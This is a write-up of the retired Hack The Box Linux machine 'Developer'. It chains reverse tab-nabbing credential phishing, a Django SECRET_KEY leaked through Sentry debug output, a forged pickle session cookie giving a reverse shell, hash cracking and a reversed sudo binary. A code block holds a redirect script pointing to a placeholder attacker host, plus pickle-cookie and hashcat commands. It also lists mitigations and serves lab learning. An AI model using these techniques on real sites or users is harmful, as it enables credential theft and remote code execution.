---
machine: Developer
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, web, django, reverse-tabnabbing, pickle, postgresql, privesc]
---

# Developer — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The challenge platform lets users submit a writeup link the admin visits. A reverse tab-nabbing attack redirects the original tab to a fake login and captures the admin credentials, which work for Django admin and Sentry. Sentry leaks `SECRET_KEY` in debug mode; sign a pickle cookie with it to run code as `www-data`. PostgreSQL hashes lead to `karl`, and a binary run with sudo reveals root's password.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` SSH and `80` Apache with a CTF-like platform.
- Registration, login, password reset and writeup submission.
- Eight challenges across four categories; the admin reviews submitted links.

## Enumeration

The profile allows submitting a writeup URL. The link opens with `target="_blank"` and no `rel=noopener`, so the new page can change `window.opener.location`. Host a page that redirects the original tab to a cloned login and logs the POST.

## Foothold

The admin enters credentials in the fake login. Use them for `/admin` and Sentry. Trigger an error so Django shows debug and `SECRET_KEY`. Sign a session cookie with `PickleSerializer` that runs a reverse shell and get `www-data`.

```bash
# reverse tab-nabbing
<script>window.opener.location='http://<ATTACKER>/login';</script>
# pickle cookie with the leaked SECRET_KEY
python2 django_pickle.py '<CMD>'
# Django hash crack
hashcat -m 10000 karl.hash rockyou.txt```

## Lateral movement

`/home/mark/developer_ctf` contains PostgreSQL credentials. Enumerate the `platform` and `sentry` databases; crack `karl`'s PBKDF2 hash and use the password over SSH.

## Privilege escalation

`karl` can run a binary with sudo that asks for a password, encrypts it with a static key and IV, and compares it with embedded bytes. Reverse the binary to recover the key and IV, decrypt the expected value and enter it; the program asks for an SSH public key and installs it for root.

## Evidence

- Writeup link without `noopener`.
- Captured admin credentials.
- `SECRET_KEY` in Sentry debug.
- Pickle cookie and `www-data` shell.
- `karl` hash and sudo binary.

## Lessons learned

- `target="_blank"` without `noopener` enables reverse tab-nabbing.
- Debug mode exposes signing secrets.
- A Django `SECRET_KEY` with pickle cookies means RCE.
- Binaries comparing embedded secrets can be reversed.

## Mitigation and detection

- Add `rel="noopener noreferrer"` to external links.
- Disable debug and rotate `SECRET_KEY`.
- Do not use `PickleSerializer` for sessions.
- Audit sudo binaries and never embed passwords.

## References

- [0xdf — Developer](https://0xdf.gitlab.io/2022/01/15/htb-developer.html)
- [IppSec — Developer](https://www.youtube.com/watch?v=MjkDCy10BYM)
- [Hack The Box — Developer](https://app.hackthebox.com/machines/developer)
